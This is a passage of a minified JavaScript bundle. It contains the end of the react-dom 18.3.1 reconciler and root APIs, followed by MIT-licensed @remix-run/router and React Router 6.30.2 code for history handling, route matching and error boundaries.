e}throw Error(L(306,s,""))}return n;case 0:return s=n.type,a=n.pendingProps,a=n.elementType===s?a:He(s,a),ci(e,n,s,a,t);case 1:return s=n.type,a=n.pendingProps,a=n.elementType===s?a:He(s,a),Sl(e,n,s,a,t);case 3:e:{if(Xu(n),e===null)throw Error(L(387));s=n.pendingProps,r=n.memoizedState,a=r.element,Su(e,n),ba(n,s,null,t);var i=n.memoizedState;if(s=i.element,r.isDehydrated)if(r={element:s,isDehydrated:!1,cache:i.cache,pendingSuspenseBoundaries:i.pendingSuspenseBoundaries,transitions:i.transitions},n.updateQueue.baseState=r,n.memoizedState=r,n.flags&256){a=Et(Error(L(423)),n),n=_l(e,n,s,t,a);break e}else if(s!==a){a=Et(Error(L(424)),n),n=_l(e,n,s,t,a);break e}else for(Pe=En(n.stateNode.containerInfo.firstChild),Ae=n,$=!0,$e=null,t=bu(n,null,s,t),n.child=t;t;)t.flags=t.flags&-3|4096,t=t.sibling;else{if(St(),s===a){n=pn(e,n,t);break e}fe(e,n,s,t)}n=n.child}return n;case 5:return _u(n),e===null&&ai(n),s=n.type,a=n.pendingProps,r=e!==null?e.memoizedProps:null,i=a.children,Zr(s,a)?i=null:r!==null&&Zr(s,r)&&(n.flags|=32),Yu(e,n),fe(e,n,i,t),n.child;case 6:return e===null&&ai(n),null;case 13:return Qu(e,n,t);case 4:return no(n,n.stateNode.containerInfo),s=n.pendingProps,e===null?n.child=_t(n,null,s,t):fe(e,n,s,t),n.child;case 11:return s=n.type,a=n.pendingProps,a=n.elementType===s?a:He(s,a),bl(e,n,s,a,t);case 7:return fe(e,n,n.pendingProps,t),n.child;case 8:return fe(e,n,n.pendingProps.children,t),n.child;case 12:return fe(e,n,n.pendingProps.children,t),n.child;case 10:e:{if(s=n.type._context,a=n.pendingProps,r=n.memoizedProps,i=a.value,H(wa,s._currentValue),s._currentValue=i,r!==null)if(Xe(r.value,i)){if(r.children===a.children&&!_e.current){n=pn(e,n,t);break e}}else for(r=n.child,r!==null&&(r.return=n);r!==null;){var l=r.dependencies;if(l!==null){i=r.child;for(var c=l.firstContext;c!==null;){if(c.context===s){if(r.tag===1){c=ln(-1,t&-t),c.tag=2;var u=r.updateQueue;if(u!==null){u=u.shared;var f=u.pending;f===null?c.next=c:(c.next=f.next,f.next=c),u.pending=c}}r.lanes|=t,c=r.alternate,c!==null&&(c.lanes|=t),ri(r.return,t,n),l.lanes|=t;break}c=c.next}}else if(r.tag===10)i=r.type===n.type?null:r.child;else if(r.tag===18){if(i=r.return,i===null)throw Error(L(341));i.lanes|=t,l=i.alternate,l!==null&&(l.lanes|=t),ri(i,t,n),i=r.sibling}else i=r.child;if(i!==null)i.return=r;else for(i=r;i!==null;){if(i===n){i=null;break}if(r=i.sibling,r!==null){r.return=i.return,i=r;break}i=i.return}r=i}fe(e,n,a.children,t),n=n.child}return n;case 9:return a=n.type,s=n.pendingProps.children,vt(n,t),a=Fe(a),s=s(a),n.flags|=1,fe(e,n,s,t),n.child;case 14:return s=n.type,a=He(s,n.pendingProps),a=He(s.type,a),xl(e,n,s,a,t);case 15:return Gu(e,n,n.type,n.pendingProps,t);case 17:return s=n.type,a=n.pendingProps,a=n.elementType===s?a:He(s,a),na(e,n),n.tag=1,Te(s)?(e=!0,ga(n)):e=!1,vt(n,t),Wu(n,s,a),oi(n,s,a,t),ui(null,n,s,!0,e,t);case 19:return Ju(e,n,t);case 22:return Ku(e,n,t)}throw Error(L(156,n.tag))};function fd(e,n){return Bc(e,n)}function df(e,n,t,s){this.tag=e,this.key=t,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=n,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=s,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function De(e,n,t,s){return new df(e,n,t,s)}function yo(e){return e=e.prototype,!(!e||!e.isReactComponent)}function pf(e){if(typeof e=="function")return yo(e)?1:0;if(e!=null){if(e=e.$$typeof,e===qi)return 11;if(e===Ri)return 14}return 2}function An(e,n){var t=e.alternate;return t===null?(t=De(e.tag,n,e.key,e.mode),t.elementType=e.elementType,t.type=e.type,t.stateNode=e.stateNode,t.alternate=e,e.alternate=t):(t.pendingProps=n,t.type=e.type,t.flags=0,t.subtreeFlags=0,t.deletions=null),t.flags=e.flags&14680064,t.childLanes=e.childLanes,t.lanes=e.lanes,t.child=e.child,t.memoizedProps=e.memoizedProps,t.memoizedState=e.memoizedState,t.updateQueue=e.updateQueue,n=e.dependencies,t.dependencies=n===null?null:{lanes:n.lanes,firstContext:n.firstContext},t.sibling=e.sibling,t.index=e.index,t.ref=e.ref,t}function aa(e,n,t,s,a,r){var i=2;if(s=e,typeof e=="function")yo(e)&&(i=1);else if(typeof e=="string")i=5;else e:switch(e){case tt:return Hn(t.children,a,r,n);case Ii:i=8,a|=8;break;case Nr:return e=De(12,t,n,a|2),e.elementType=Nr,e.lanes=r,e;case Mr:return e=De(13,t,n,a),e.elementType=Mr,e.lanes=r,e;case jr:return e=De(19,t,n,a),e.elementType=jr,e.lanes=r,e;case _c:return Ba(t,a,r,n);default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case xc:i=10;break e;case Sc:i=9;break e;case qi:i=11;break e;case Ri:i=14;break e;case gn:i=16,s=null;break e}throw Error(L(130,e==null?e:typeof e,""))}return n=De(i,t,n,a),n.elementType=e,n.type=s,n.lanes=r,n}function Hn(e,n,t,s){return e=De(7,e,s,n),e.lanes=t,e}function Ba(e,n,t,s){return e=De(22,e,s,n),e.elementType=_c,e.lanes=t,e.stateNode={isHidden:!1},e}function wr(e,n,t){return e=De(6,e,null,n),e.lanes=t,e}function kr(e,n,t){return n=De(4,e.children!==null?e.children:[],e.key,n),n.lanes=t,n.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},n}function hf(e,n,t,s,a){this.tag=n,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=er(0),this.expirationTimes=er(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=er(0),this.identifierPrefix=s,this.onRecoverableError=a,this.mutableSourceEagerHydrationData=null}function vo(e,n,t,s,a,r,i,l,c){return e=new hf(e,n,t,l,c),n===1?(n=1,r===!0&&(n|=8)):n=0,r=De(3,null,null,n),e.current=r,r.stateNode=e,r.memoizedState={element:s,isDehydrated:t,cache:null,transitions:null,pendingSuspenseBoundaries:null},eo(r),e}function ff(e,n,t){var s=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:nt,key:s==null?null:""+s,children:e,containerInfo:n,implementation:t}}function md(e){if(!e)return jn;e=e._reactInternals;e:{if(Qn(e)!==e||e.tag!==1)throw Error(L(170));var n=e;do{switch(n.tag){case 3:n=n.stateNode.context;break e;case 1:if(Te(n.type)){n=n.stateNode.__reactInternalMemoizedMergedChildContext;break e}}n=n.return}while(n!==null);throw Error(L(171))}if(e.tag===1){var t=e.type;if(Te(t))return mu(e,t,n)}return n}function gd(e,n,t,s,a,r,i,l,c){return e=vo(t,s,!0,e,a,r,i,l,c),e.context=md(null),t=e.current,s=ge(),a=Pn(t),r=ln(s,a),r.callback=n??null,Ln(t,r,a),e.current.lanes=a,bs(e,a,s),Ee(e,s),e}function Ua(e,n,t,s){var a=n.current,r=ge(),i=Pn(a);return t=md(t),n.context===null?n.context=t:n.pendingContext=t,n=ln(r,i),n.payload={element:e},s=s===void 0?null:s,s!==null&&(n.callback=s),e=Ln(a,n,i),e!==null&&(Ye(e,a,i,r),Js(e,a,i)),i}function Pa(e){if(e=e.current,!e.child)return null;switch(e.child.tag){case 5:return e.child.stateNode;default:return e.child.stateNode}}function Il(e,n){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var t=e.retryLane;e.retryLane=t!==0&&t<n?t:n}}function wo(e,n){Il(e,n),(e=e.alternate)&&Il(e,n)}function mf(){return null}var yd=typeof reportError=="function"?reportError:function(e){console.error(e)};function ko(e){this._internalRoot=e}Ha.prototype.render=ko.prototype.render=function(e){var n=this._internalRoot;if(n===null)throw Error(L(409));Ua(e,n,null,null)};Ha.prototype.unmount=ko.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var n=e.containerInfo;Yn(function(){Ua(null,e,null,null)}),n[un]=null}};function Ha(e){this._internalRoot=e}Ha.prototype.unstable_scheduleHydration=function(e){if(e){var n=Kc();e={blockedOn:null,target:e,priority:n};for(var t=0;t<vn.length&&n!==0&&n<vn[t].priority;t++);vn.splice(t,0,e),t===0&&Xc(e)}};function bo(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function Wa(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11&&(e.nodeType!==8||e.nodeValue!==" react-mount-point-unstable "))}function ql(){}function gf(e,n,t,s,a){if(a){if(typeof s=="function"){var r=s;s=function(){var u=Pa(i);r.call(u)}}var i=gd(n,s,e,0,null,!1,!1,"",ql);return e._reactRootContainer=i,e[un]=i.current,cs(e.nodeType===8?e.parentNode:e),Yn(),i}for(;a=e.lastChild;)e.removeChild(a);if(typeof s=="function"){var l=s;s=function(){var u=Pa(c);l.call(u)}}var c=vo(e,0,!1,null,null,!1,!1,"",ql);return e._reactRootContainer=c,e[un]=c.current,cs(e.nodeType===8?e.parentNode:e),Yn(function(){Ua(n,c,t,s)}),c}function Va(e,n,t,s,a){var r=t._reactRootContainer;if(r){var i=r;if(typeof a=="function"){var l=a;a=function(){var c=Pa(i);l.call(c)}}Ua(n,i,e,a)}else i=gf(t,n,e,a,s);return Pa(i)}$c=function(e){switch(e.tag){case 3:var n=e.stateNode;if(n.current.memoizedState.isDehydrated){var t=Wt(n.pendingLanes);t!==0&&(zi(n,t|1),Ee(n,J()),!(z&6)&&(Lt=J()+500,Rn()))}break;case 13:Yn(function(){var s=dn(e,1);if(s!==null){var a=ge();Ye(s,e,1,a)}}),wo(e,1)}};Fi=function(e){if(e.tag===13){var n=dn(e,134217728);if(n!==null){var t=ge();Ye(n,e,134217728,t)}wo(e,134217728)}};Gc=function(e){if(e.tag===13){var n=Pn(e),t=dn(e,n);if(t!==null){var s=ge();Ye(t,e,n,s)}wo(e,n)}};Kc=function(){return B};Yc=function(e,n){var t=B;try{return B=e,n()}finally{B=t}};Hr=function(e,n,t){switch(n){case"input":if(Rr(e,t),n=t.name,t.type==="radio"&&n!=null){for(t=e;t.parentNode;)t=t.parentNode;for(t=t.querySelectorAll("input[name="+JSON.stringify(""+n)+'][type="radio"]'),n=0;n<t.length;n++){var s=t[n];if(s!==e&&s.form===e.form){var a=qa(s);if(!a)throw Error(L(90));Ec(s),Rr(s,a)}}}break;case"textarea":Cc(e,t);break;case"select":n=t.value,n!=null&&ft(e,!!t.multiple,n,!1)}};qc=fo;Rc=Yn;var yf={usingClientEntryPoint:!1,Events:[Ss,it,qa,jc,Ic,fo]},Ft={findFiberByHostInstance:zn,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},vf={bundleType:Ft.bundleType,version:Ft.version,rendererPackageName:Ft.rendererPackageName,rendererConfig:Ft.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:hn.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return e=zc(e),e===null?null:e.stateNode},findFiberByHostInstance:Ft.findFiberByHostInstance||mf,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var Us=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!Us.isDisabled&&Us.supportsFiber)try{Na=Us.inject(vf),en=Us}catch{}}Me.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=yf;Me.createPortal=function(e,n){var t=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!bo(n))throw Error(L(200));return ff(e,n,null,t)};Me.createRoot=function(e,n){if(!bo(e))throw Error(L(299));var t=!1,s="",a=yd;return n!=null&&(n.unstable_strictMode===!0&&(t=!0),n.identifierPrefix!==void 0&&(s=n.identifierPrefix),n.onRecoverableError!==void 0&&(a=n.onRecoverableError)),n=vo(e,1,!1,null,null,t,!1,s,a),e[un]=n.current,cs(e.nodeType===8?e.parentNode:e),new ko(n)};Me.findDOMNode=function(e){if(e==null)return null;if(e.nodeType===1)return e;var n=e._reactInternals;if(n===void 0)throw typeof e.render=="function"?Error(L(188)):(e=Object.keys(e).join(","),Error(L(268,e)));return e=zc(n),e=e===null?null:e.stateNode,e};Me.flushSync=function(e){return Yn(e)};Me.hydrate=function(e,n,t){if(!Wa(n))throw Error(L(200));return Va(null,e,n,!0,t)};Me.hydrateRoot=function(e,n,t){if(!bo(e))throw Error(L(405));var s=t!=null&&t.hydratedSources||null,a=!1,r="",i=yd;if(t!=null&&(t.unstable_strictMode===!0&&(a=!0),t.identifierPrefix!==void 0&&(r=t.identifierPrefix),t.onRecoverableError!==void 0&&(i=t.onRecoverableError)),n=gd(n,null,e,1,t??null,a,!1,r,i),e[un]=n.current,cs(e),s)for(e=0;e<s.length;e++)t=s[e],a=t._getVersion,a=a(t._source),n.mutableSourceEagerHydrationData==null?n.mutableSourceEagerHydrationData=[t,a]:n.mutableSourceEagerHydrationData.push(t,a);return new Ha(n)};Me.render=function(e,n,t){if(!Wa(n))throw Error(L(200));return Va(null,e,n,!1,t)};Me.unmountComponentAtNode=function(e){if(!Wa(e))throw Error(L(40));return e._reactRootContainer?(Yn(function(){Va(null,null,e,!1,function(){e._reactRootContainer=null,e[un]=null})}),!0):!1};Me.unstable_batchedUpdates=fo;Me.unstable_renderSubtreeIntoContainer=function(e,n,t,s){if(!Wa(t))throw Error(L(200));if(e==null||e._reactInternals===void 0)throw Error(L(38));return Va(e,n,t,!1,s)};Me.version="18.3.1-next-f1338f8080-20240426";function vd(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(vd)}catch(e){console.error(e)}}vd(),vc.exports=Me;var wf=vc.exports,wd,Rl=wf;wd=Rl.createRoot,Rl.hydrateRoot;/**
 * @remix-run/router v1.23.1
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function vs(){return vs=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var s in t)Object.prototype.hasOwnProperty.call(t,s)&&(e[s]=t[s])}return e},vs.apply(this,arguments)}var xn;(function(e){e.Pop="POP",e.Push="PUSH",e.Replace="REPLACE"})(xn||(xn={}));const Ol="popstate";function kf(e){e===void 0&&(e={});function n(s,a){let{pathname:r,search:i,hash:l}=s.location;return xi("",{pathname:r,search:i,hash:l},a.state&&a.state.usr||null,a.state&&a.state.key||"default")}function t(s,a){return typeof a=="string"?a:kd(a)}return xf(n,t,null,e)}function se(e,n){if(e===!1||e===null||typeof e>"u")throw new Error(n)}function xo(e,n){if(!e){typeof console<"u"&&console.warn(n);try{throw new Error(n)}catch{}}}function bf(){return Math.random().toString(36).substr(2,8)}function Dl(e,n){return{usr:e.state,key:e.key,idx:n}}function xi(e,n,t,s){return t===void 0&&(t=null),vs({pathname:typeof e=="string"?e:e.pathname,search:"",hash:""},typeof n=="string"?Mt(n):n,{state:t,key:n&&n.key||s||bf()})}function kd(e){let{pathname:n="/",search:t="",hash:s=""}=e;return t&&t!=="?"&&(n+=t.charAt(0)==="?"?t:"?"+t),s&&s!=="#"&&(n+=s.charAt(0)==="#"?s:"#"+s),n}function Mt(e){let n={};if(e){let t=e.indexOf("#");t>=0&&(n.hash=e.substr(t),e=e.substr(0,t));let s=e.indexOf("?");s>=0&&(n.search=e.substr(s),e=e.substr(0,s)),e&&(n.pathname=e)}return n}function xf(e,n,t,s){s===void 0&&(s={});let{window:a=document.defaultView,v5Compat:r=!1}=s,i=a.history,l=xn.Pop,c=null,u=f();u==null&&(u=0,i.replaceState(vs({},i.state,{idx:u}),""));function f(){return(i.state||{idx:null}).idx}function p(){l=xn.Pop;let S=f(),m=S==null?null:S-u;u=S,c&&c({action:l,location:y.location,delta:m})}function g(S,m){l=xn.Push;let d=xi(y.location,S,m);u=f()+1;let h=Dl(d,u),x=y.createHref(d);try{i.pushState(h,"",x)}catch(b){if(b instanceof DOMException&&b.name==="DataCloneError")throw b;a.location.assign(x)}r&&c&&c({action:l,location:y.location,delta:1})}function v(S,m){l=xn.Replace;let d=xi(y.location,S,m);u=f();let h=Dl(d,u),x=y.createHref(d);i.replaceState(h,"",x),r&&c&&c({action:l,location:y.location,delta:0})}function k(S){let m=a.location.origin!=="null"?a.location.origin:a.location.href,d=typeof S=="string"?S:kd(S);return d=d.replace(/ $/,"%20"),se(m,"No window.location.(origin|href) available to create URL for href: "+d),new URL(d,m)}let y={get action(){return l},get location(){return e(a,i)},listen(S){if(c)throw new Error("A history only accepts one active listener");return a.addEventListener(Ol,p),c=S,()=>{a.removeEventListener(Ol,p),c=null}},createHref(S){return n(a,S)},createURL:k,encodeLocation(S){let m=k(S);return{pathname:m.pathname,search:m.search,hash:m.hash}},push:g,replace:v,go(S){return i.go(S)}};return y}var zl;(function(e){e.data="data",e.deferred="deferred",e.redirect="redirect",e.error="error"})(zl||(zl={}));function Sf(e,n,t){return t===void 0&&(t="/"),_f(e,n,t)}function _f(e,n,t,s){let a=typeof n=="string"?Mt(n):n,r=Sd(a.pathname||"/",t);if(r==null)return null;let i=bd(e);Tf(i);let l=null;for(let c=0;l==null&&c<i.length;++c){let u=Of(r);l=If(i[c],u)}return l}function bd(e,n,t,s){n===void 0&&(n=[]),t===void 0&&(t=[]),s===void 0&&(s="");let a=(r,i,l)=>{let c={relativePath:l===void 0?r.path||"":l,caseSensitive:r.caseSensitive===!0,childrenIndex:i,route:r};c.relativePath.startsWith("/")&&(se(c.relativePath.startsWith(s),'Absolute route path "'+c.relativePath+'" nested under path '+('"'+s+'" is not valid. An absolute child route path ')+"must start with the combined path of all its parent routes."),c.relativePath=c.relativePath.slice(s.length));let u=Wn([s,c.relativePath]),f=t.concat(c);r.children&&r.children.length>0&&(se(r.index!==!0,"Index routes must not have child routes. Please remove "+('all child routes from route path "'+u+'".')),bd(r.children,n,f,u)),!(r.path==null&&!r.index)&&n.push({path:u,score:Mf(u,r.index),routesMeta:f})};return e.forEach((r,i)=>{var l;if(r.path===""||!((l=r.path)!=null&&l.includes("?")))a(r,i);else for(let c of xd(r.path))a(r,i,c)}),n}function xd(e){let n=e.split("/");if(n.length===0)return[];let[t,...s]=n,a=t.endsWith("?"),r=t.replace(/\?$/,"");if(s.length===0)return a?[r,""]:[r];let i=xd(s.join("/")),l=[];return l.push(...i.map(c=>c===""?r:[r,c].join("/"))),a&&l.push(...i),l.map(c=>e.startsWith("/")&&c===""?"/":c)}function Tf(e){e.sort((n,t)=>n.score!==t.score?t.score-n.score:jf(n.routesMeta.map(s=>s.childrenIndex),t.routesMeta.map(s=>s.childrenIndex)))}const Ef=/^:[\w-]+$/,Lf=3,Cf=2,Pf=1,Af=10,Nf=-2,Fl=e=>e==="*";function Mf(e,n){let t=e.split("/"),s=t.length;return t.some(Fl)&&(s+=Nf),n&&(s+=Cf),t.filter(a=>!Fl(a)).reduce((a,r)=>a+(Ef.test(r)?Lf:r===""?Pf:Af),s)}function jf(e,n){return e.length===n.length&&e.slice(0,-1).every((s,a)=>s===n[a])?e[e.length-1]-n[n.length-1]:0}function If(e,n,t){let{routesMeta:s}=e,a={},r="/",i=[];for(let l=0;l<s.length;++l){let c=s[l],u=l===s.length-1,f=r==="/"?n:n.slice(r.length)||"/",p=qf({path:c.relativePath,caseSensitive:c.caseSensitive,end:u},f),g=c.route;if(!p)return null;Object.assign(a,p.params),i.push({params:a,pathname:Wn([r,p.pathname]),pathnameBase:Wf(Wn([r,p.pathnameBase])),route:g}),p.pathnameBase!=="/"&&(r=Wn([r,p.pathnameBase]))}return i}function qf(e,n){typeof e=="string"&&(e={path:e,caseSensitive:!1,end:!0});let[t,s]=Rf(e.path,e.caseSensitive,e.end),a=n.match(t);if(!a)return null;let r=a[0],i=r.replace(/(.)\/+$/,"$1"),l=a.slice(1);return{params:s.reduce((u,f,p)=>{let{paramName:g,isOptional:v}=f;if(g==="*"){let y=l[p]||"";i=r.slice(0,r.length-y.length).replace(/(.)\/+$/,"$1")}const k=l[p];return v&&!k?u[g]=void 0:u[g]=(k||"").replace(/%2F/g,"/"),u},{}),pathname:r,pathnameBase:i,pattern:e}}function Rf(e,n,t){n===void 0&&(n=!1),t===void 0&&(t=!0),xo(e==="*"||!e.endsWith("*")||e.endsWith("/*"),'Route path "'+e+'" will be treated as if it were '+('"'+e.replace(/\*$/,"/*")+'" because the `*` character must ')+"always follow a `/` in the pattern. To get rid of this warning, "+('please change the route path to "'+e.replace(/\*$/,"/*")+'".'));let s=[],a="^"+e.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(i,l,c)=>(s.push({paramName:l,isOptional:c!=null}),c?"/?([^\\/]+)?":"/([^\\/]+)"));return e.endsWith("*")?(s.push({paramName:"*"}),a+=e==="*"||e==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):t?a+="\\/*$":e!==""&&e!=="/"&&(a+="(?:(?=\\/|$))"),[new RegExp(a,n?void 0:"i"),s]}function Of(e){try{return e.split("/").map(n=>decodeURIComponent(n).replace(/\//g,"%2F")).join("/")}catch(n){return xo(!1,'The URL path "'+e+'" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent '+("encoding ("+n+").")),e}}function Sd(e,n){if(n==="/")return e;if(!e.toLowerCase().startsWith(n.toLowerCase()))return null;let t=n.endsWith("/")?n.length-1:n.length,s=e.charAt(t);return s&&s!=="/"?null:e.slice(t)||"/"}const Df=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,zf=e=>Df.test(e);function Ff(e,n){n===void 0&&(n="/");let{pathname:t,search:s="",hash:a=""}=typeof e=="string"?Mt(e):e,r;if(t)if(zf(t))r=t;else{if(t.includes("//")){let i=t;t=t.replace(/\/\/+/g,"/"),xo(!1,"Pathnames cannot have embedded double slashes - normalizing "+(i+" -> "+t))}t.startsWith("/")?r=Bl(t.substring(1),"/"):r=Bl(t,n)}else r=n;return{pathname:r,search:Vf(s),hash:$f(a)}}function Bl(e,n){let t=n.replace(/\/+$/,"").split("/");return e.split("/").forEach(a=>{a===".."?t.length>1&&t.pop():a!=="."&&t.push(a)}),t.length>1?t.join("/"):"/"}function br(e,n,t,s){return"Cannot include a '"+e+"' character in a manually specified "+("`to."+n+"` field ["+JSON.stringify(s)+"].  Please separate it out to the ")+("`to."+t+"` field. Alternatively you may provide the full path as ")+'a string in <Link to="..."> and the router will parse it for you.'}function Bf(e){return e.filter((n,t)=>t===0||n.route.path&&n.route.path.length>0)}function Uf(e,n){let t=Bf(e);return n?t.map((s,a)=>a===t.length-1?s.pathname:s.pathnameBase):t.map(s=>s.pathnameBase)}function Hf(e,n,t,s){s===void 0&&(s=!1);let a;typeof e=="string"?a=Mt(e):(a=vs({},e),se(!a.pathname||!a.pathname.includes("?"),br("?","pathname","search",a)),se(!a.pathname||!a.pathname.includes("#"),br("#","pathname","hash",a)),se(!a.search||!a.search.includes("#"),br("#","search","hash",a)));let r=e===""||a.pathname==="",i=r?"/":a.pathname,l;if(i==null)l=t;else{let p=n.length-1;if(!s&&i.startsWith("..")){let g=i.split("/");for(;g[0]==="..";)g.shift(),p-=1;a.pathname=g.join("/")}l=p>=0?n[p]:"/"}let c=Ff(a,l),u=i&&i!=="/"&&i.endsWith("/"),f=(r||i===".")&&t.endsWith("/");return!c.pathname.endsWith("/")&&(u||f)&&(c.pathname+="/"),c}const Wn=e=>e.join("/").replace(/\/\/+/g,"/"),Wf=e=>e.replace(/\/+$/,"").replace(/^\/*/,"/"),Vf=e=>!e||e==="?"?"":e.startsWith("?")?e:"?"+e,$f=e=>!e||e==="#"?"":e.startsWith("#")?e:"#"+e;function Gf(e){return e!=null&&typeof e.status=="number"&&typeof e.statusText=="string"&&typeof e.internal=="boolean"&&"data"in e}const _d=["post","put","patch","delete"];new Set(_d);const Kf=["get",..._d];new Set(Kf);/**
 * React Router v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function ws(){return ws=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var s in t)Object.prototype.hasOwnProperty.call(t,s)&&(e[s]=t[s])}return e},ws.apply(this,arguments)}const So=w.createContext(null),Yf=w.createContext(null),$a=w.createContext(null),Ga=w.createContext(null),Jn=w.createContext({outlet:null,matches:[],isDataRoute:!1}),Td=w.createContext(null);function Ka(){return w.useContext(Ga)!=null}function _o(){return Ka()||se(!1),w.useContext(Ga).location}function Ed(e){w.useContext($a).static||w.useLayoutEffect(e)}function Xf(){let{isDataRoute:e}=w.useContext(Jn);return e?um():Qf()}function Qf(){Ka()||se(!1);let e=w.useContext(So),{basename:n,future:t,navigator:s}=w.useContext($a),{matches:a}=w.useContext(Jn),{pathname:r}=_o(),i=JSON.stringify(Uf(a,t.v7_relativeSplatPath)),l=w.useRef(!1);return Ed(()=>{l.current=!0}),w.useCallback(function(u,f){if(f===void 0&&(f={}),!l.current)return;if(typeof u=="number"){s.go(u);return}let p=Hf(u,JSON.parse(i),r,f.relative==="path");e==null&&n!=="/"&&(p.pathname=p.pathname==="/"?n:Wn([n,p.pathname])),(f.replace?s.replace:s.push)(p,f.state,f)},[n,s,i,r,e])}function Jf(){let{matches:e}=w.useContext(Jn),n=e[e.length-1];return n?n.params:{}}function Zf(e,n){return em(e,n)}function em(e,n,t,s){Ka()||se(!1);let{navigator:a}=w.useContext($a),{matches:r}=w.useContext(Jn),i=r[r.length-1],l=i?i.params:{};i&&i.pathname;let c=i?i.pathnameBase:"/";i&&i.route;let u=_o(),f;if(n){var p;let S=typeof n=="string"?Mt(n):n;c==="/"||(p=S.pathname)!=null&&p.startsWith(c)||se(!1),f=S}else f=u;let g=f.pathname||"/",v=g;if(c!=="/"){let S=c.replace(/^\//,"").split("/");v="/"+g.replace(/^\//,"").split("/").slice(S.length).join("/")}let k=Sf(e,{pathname:v}),y=rm(k&&k.map(S=>Object.assign({},S,{params:Object.assign({},l,S.params),pathname:Wn([c,a.encodeLocation?a.encodeLocation(S.pathname).pathname:S.pathname]),pathnameBase:S.pathnameBase==="/"?c:Wn([c,a.encodeLocation?a.encodeLocation(S.pathnameBase).pathname:S.pathnameBase])})),r,t,s);return n&&y?w.createElement(Ga.Provider,{value:{location:ws({pathname:"/",search:"",hash:"",state:null,key:"default"},f),navigationType:xn.Pop}},y):y}function nm(){let e=cm(),n=Gf(e)?e.status+" "+e.statusText:e instanceof Error?e.message:JSON.stringify(e),t=e instanceof Error?e.stack:null,a={padding:"0.5rem",backgroundColor:"rgba(200,200,200, 0.5)"};return w.createElement(w.Fragment,null,w.createElement("h2",null,"Unexpected Application Error!"),w.createElement("h3",{style:{fontStyle:"italic"}},n),t?w.createElement("pre",{style:a},t):null,null)}const tm=w.createElement(nm,null);class sm extends w.Component{constructor(n){super(n),this.state={location:n.location,revalidation:n.revalidation,error:n.error}}static getDerivedStateFromError(n){return{error:n}}static getDerivedStateFromProps(n,t){return t.location!==n.location||t.revalidation!=="idle"&&n.revalidation==="idle"?{error:n.error,location:n.location,revalidation:n.revalidation}:{error:n.error!==void 0?n.error:t.error,location:t.location,revalidation:n.revalidation||t.revalidation}}componentDidCatch(n,t){console.error("React Router caught the following error during render",n,t)}render(){return this.state.error!==void 0?w.createElement(Jn.Provider,{value:this.props.routeContext},w.createElement(Td.Provider,{value:this.state.error,children:this.props.component})):this.props.children}}function am(e){let{routeContext:n,match:t,children:s}=e,a=w.useContext(So);return a&&a.static&&a.staticContext&&(t.route.errorElement||t.route.ErrorBoundary)&&(a.staticContext._deepestRenderedBoundaryId=t.route.id),w.createElement(Jn.Provider,{value:n},s)}function rm(e,n,t,s){var a;if(n===void 0&&(n=[]),t===void 0&&(t=null),s===void 0&&(s=null),e==null){var r;if(!t)return null;if(t.errors)e=t.matches;else if((r=s)!=null&&r.v7_partialHydration&&n.length===0&&!t.initialized&&t.matches.length>0)e=t.matches;else return null}let i=e,l=(a=t)==null?void 0:a.errors;if(l!=null){let f=i.findIndex(p=>p.route.id&&(l==null?void 0:l[p.route.id])!==void 0);f>=0||se(!1),i=i.slice(0,Math.min(i.length,f+1))}let c=!1,u=-1;if(t&&s&&s.v7_partialHydration)for(let f=0;f<i.length;f++){let p=i[f];if((p.route.HydrateFallback||p.route.hydrateFallbackElement)&&(u=f),p.route.id){let{loaderData:g,errors:v}=t,k=p.route.loader&&g[p.route.id]===void 0&&(!v||v[p.route.id]===void 0);if(p.route.lazy||k){c=!0,u>=0?i=i.slice(0,u+1):i=[i[0]];break}}}return i.reduceRight((f,p,g)=>{let 